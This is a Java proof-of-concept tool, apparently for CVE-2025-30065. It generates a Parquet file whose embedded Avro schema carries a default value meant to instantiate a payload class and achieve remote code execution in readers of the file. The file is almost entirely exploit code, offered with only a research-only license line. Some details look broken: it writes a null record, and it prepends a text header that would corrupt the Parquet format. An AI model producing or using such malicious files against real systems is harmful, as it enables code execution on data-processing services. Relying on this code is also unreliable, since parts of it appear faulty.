/**
 * @author h3st4k3r
 * @version 1.1
 * @license For authorized security research and educational purposes only.
 */

import org.apache.avro.Schema;
import org.apache.parquet.avro.AvroParquetWriter;
import org.apache.parquet.hadoop.ParquetWriter;
import org.apache.hadoop.conf.Configuration;
import org.apache.hadoop.fs.Path;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

/**
 * Generates a Parquet file with a malicious Avro schema to demonstrate CVE-2025-30065.
 * Includes a warning header to indicate its purpose for security research.
 */
public class ParquetExploitGenerator {

    private static final String DEFAULT_OUTPUT_FILE = "exploit.parquet";
    private static final String DEFAULT_WARNING_HEADER = "X-PoC-Warning: This is a proof of concept for CVE-2025-30065 - Unauthorized use is prohibited.";

    public static void main(String[] args) {
        String outputFile = args.length > 0 ? args[0] : DEFAULT_OUTPUT_FILE;
        String warningHeader = args.length > 1 ? args[1] : DEFAULT_WARNING_HEADER;

        try {
            generateMaliciousParquetFile(outputFile, warningHeader);
            System.out.println("[+] Malicious file generated: " + outputFile);
            System.out.println("[+] Contains warning headers and metadata.");
        } catch (IOException e) {
            System.err.println("[-] Failed to generate malicious Parquet file: " + e.getMessage());
            e.printStackTrace();
        }
    }

    /**
     * Generates a Parquet file with a malicious Avro schema.
     *
     * @param outputFile   The name of the output Parquet file.
     * @param warningHeader The warning header to include in the file metadata.
     * @throws IOException If an I/O error occurs during file creation.
     */
    private static void generateMaliciousParquetFile(String outputFile, String warningHeader) throws IOException {
        // Define a malicious Avro schema with a default value that triggers class instantiation
        String maliciousSchemaJson = "{"
            + "\"type\":\"record\","
            + "\"name\":\"SecurityTest\","
            + "\"fields\":[{"
            + "\"name\":\"payload\","
            + "\"type\":\"string\","
            + "\"default\":\"!com.securitytest.RCEPayload\""
            + "}]}";

        Schema schema = new Schema.Parser().parse(maliciousSchemaJson);

        // Configure Parquet writer with Hadoop's Path and Configuration
        Path path = new Path(outputFile);
        Configuration conf = new Configuration();

        // Create Parquet writer with the malicious schema
        try (ParquetWriter<Object> writer = AvroParquetWriter.builder(path)
            .withSchema(schema)
            .withConf(conf)
            .build()) {
            // Write an empty record to embed the schema
            writer.write(null);
        }

        // Append the warning header to the Parquet file
        appendWarningHeader(outputFile, warningHeader);
    }

    /**
     * Appends a warning header to the beginning of the Parquet file.
     *
     * @param filePath     The path to the Parquet file.
     * @param warningHeader The warning header to append.
     * @throws IOException If an I/O error occurs during file modification.
     */
    private static void appendWarningHeader(String filePath, String warningHeader) throws IOException {
        // Read the existing file content
        byte[] originalContent = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(filePath));

        // Prepend the warning header
        byte[] headerBytes = (warningHeader + "\n").getBytes(StandardCharsets.UTF_8);
        byte[] newContent = new byte[headerBytes.length + originalContent.length];

        System.arraycopy(headerBytes, 0, newContent, 0, headerBytes.length);
        System.arraycopy(originalContent, 0, newContent, headerBytes.length, originalContent.length);

        // Write the new content back to the file
        java.nio.file.Files.write(java.nio.file.Paths.get(filePath), newContent);
    }
}
